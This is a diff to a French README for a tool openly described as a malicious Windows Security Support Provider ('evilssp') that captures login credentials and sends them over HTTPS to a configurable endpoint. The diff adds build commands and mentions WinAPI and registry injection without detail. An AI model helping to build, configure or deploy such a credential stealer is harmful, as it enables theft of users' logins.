@@ -1,4 +1,4 @@
-# chevalo_ssp
+# evilssp
 # TL;DR
 
 gros copier coller de 
@@ -18,19 +18,25 @@ Chat GPT
 
 chevalo_ssp est donc un ssp malveillant qui récupére les identifiants de connexion et les envois en https sur un endpoint choisie.
 
-# configuration
+# Configuration
 
 il est possible de modifier:
 * URL
 * User-Agent
 
+# Compilation
+
+```sh
+mkdir -p build && cd build
+CC=x86_64-w64-mingw32-gcc cmake ..
+make -j 8
+```
+
 # injection
-
-
 
 ## injection via winapi
 
-CF ssp_injector qui arrive bientot je l'ai ouvlier aux boulot donc a dans 2-3 semaines.
+google
 
 ## injection via clef de registre
 
